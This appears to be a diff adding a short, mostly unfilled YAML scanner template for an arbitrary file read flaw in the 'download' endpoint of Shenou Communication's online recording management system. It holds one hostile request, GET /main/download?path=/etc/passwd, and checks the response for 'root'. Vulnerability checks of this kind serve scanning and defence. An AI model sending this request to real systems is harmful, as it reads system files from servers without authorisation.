@@ -1,0 +1,15 @@
+id:
+
+info:
+  name: 申瓯通信在线录音管理系统 download 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /main/download?path=/etc/passwd
+response1:
+  body: root
+requests2:
+response2:
